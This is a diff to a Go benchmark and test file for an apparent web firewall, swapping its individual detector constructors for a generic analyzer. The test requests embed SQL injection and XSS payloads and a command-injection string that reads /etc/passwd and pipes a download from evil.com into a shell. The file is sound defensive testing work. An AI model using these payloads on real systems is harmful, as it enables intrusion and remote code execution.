@@ -20,7 +20,7 @@ import (
 
 // Benchmark single detector performance
 func BenchmarkSQLDetector(b *testing.B) {
-	d := NewSQLDetector("block")
+	d := NewAnalyzer("block", 2, "sqli")
 	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&id=1'+union+select+1,2,3--", nil)
 	reqCtx, _ := engine.NewRequestContext(req, "default")
 	b.ResetTimer()
@@ -30,7 +30,7 @@ func BenchmarkSQLDetector(b *testing.B) {
 }
 
 func BenchmarkXSSDetector(b *testing.B) {
-	d := NewXSSDetector("block")
+	d := NewAnalyzer("block", 2, "xss")
 	req := httptest.NewRequest("GET", "/comment?text=<script>alert(1)</script><img+src=x+onerror=alert(1)>", nil)
 	reqCtx, _ := engine.NewRequestContext(req, "default")
 	b.ResetTimer()
@@ -40,7 +40,7 @@ func BenchmarkXSSDetector(b *testing.B) {
 }
 
 func BenchmarkRCEDetector(b *testing.B) {
-	d := NewRCEDetector("block")
+	d := NewAnalyzer("block", 2, "rce")
 	req := httptest.NewRequest("GET", "/run?cmd=;cat+/etc/passwd;id;curl+evil.com|sh", nil)
 	reqCtx, _ := engine.NewRequestContext(req, "default")
 	b.ResetTimer()
@@ -51,11 +51,11 @@ func BenchmarkRCEDetector(b *testing.B) {
 
 func BenchmarkFullPipeline(b *testing.B) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"),
-		NewXSSDetector("block"),
-		NewRCEDetector("block"),
-		NewLFIDetector("block"),
-		NewSSRFDetector("block"),
+		NewAnalyzer("block", 2, "sqli"),
+		NewAnalyzer("block", 2, "xss"),
+		NewAnalyzer("block", 2, "rce"),
+		NewAnalyzer("block", 2, "lfi"),
+		NewAnalyzer("block", 2, "ssrf"),
 	)
 	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--&x=<script>alert(1)</script>", nil)
 	reqCtx, _ := engine.NewRequestContext(req, "default")
@@ -221,7 +221,7 @@ func BenchmarkPipelineWithRules(b *testing.B) {
 		ID: "test-rule", Name: "test", Pattern: re,
 		Location: "uri", Action: engine.ActionBlock, Severity: engine.SeverityHigh, Priority: 100, Enabled: true,
 	}}
-	pipeline := engine.NewPipeline(enginerules.New(rules), NewSQLDetector("block"), NewXSSDetector("block"))
+	pipeline := engine.NewPipeline(enginerules.New(rules), NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"))
 	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
 	reqCtx, _ := engine.NewRequestContext(req, "default")
 	b.ResetTimer()
@@ -233,8 +233,8 @@ func BenchmarkPipelineWithRules(b *testing.B) {
 // Concurrent benchmarks
 func BenchmarkPipelineConcurrent(b *testing.B) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
-		NewLFIDetector("block"), NewSSRFDetector("block"),
+		NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"), NewAnalyzer("block", 2, "rce"),
+		NewAnalyzer("block", 2, "lfi"), NewAnalyzer("block", 2, "ssrf"),
 	)
 	b.RunParallel(func(pb *testing.PB) {
 		for pb.Next() {
@@ -248,8 +248,8 @@ func BenchmarkPipelineConcurrent(b *testing.B) {
 // Throughput test
 func BenchmarkThroughput(b *testing.B) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
-		NewLFIDetector("block"), NewSSRFDetector("block"),
+		NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"), NewAnalyzer("block", 2, "rce"),
+		NewAnalyzer("block", 2, "lfi"), NewAnalyzer("block", 2, "ssrf"),
 	)
 	payloads := []string{
 		"/search?q=1'+or+1=1--",
@@ -273,8 +273,8 @@ func BenchmarkThroughput(b *testing.B) {
 // High-concurrency stress test
 func TestPipelineHighConcurrency(t *testing.T) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
-		NewLFIDetector("block"), NewSSRFDetector("block"),
+		NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"), NewAnalyzer("block", 2, "rce"),
+		NewAnalyzer("block", 2, "lfi"), NewAnalyzer("block", 2, "ssrf"),
 	)
 	payloads := []string{
 		"/search?q=1'+or+1=1--",
@@ -382,7 +382,7 @@ func raceDetectorEnabled() bool {
 // Latency distribution test
 func TestPipelineLatency(t *testing.T) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
+		NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"), NewAnalyzer("block", 2, "rce"),
 	)
 	req := httptest.NewRequest("GET", "/search?q=1'+or+1=1--", nil)
 	ctx := context.Background()
@@ -466,8 +466,8 @@ func percentile(values []int64, q float64) int64 {
 // Memory allocation benchmark
 func BenchmarkAllocations(b *testing.B) {
 	pipeline := engine.NewPipeline(
-		NewSQLDetector("block"), NewXSSDetector("block"), NewRCEDetector("block"),
-		NewLFIDetector("block"), NewSSRFDetector("block"),
+		NewAnalyzer("block", 2, "sqli"), NewAnalyzer("block", 2, "xss"), NewAnalyzer("block", 2, "rce"),
+		NewAnalyzer("block", 2, "lfi"), NewAnalyzer("block", 2, "ssrf"),
 	)
 	req := httptest.NewRequest("GET", "/search?q="+strings.Repeat("x", 200), nil)
 	ctx := context.Background()
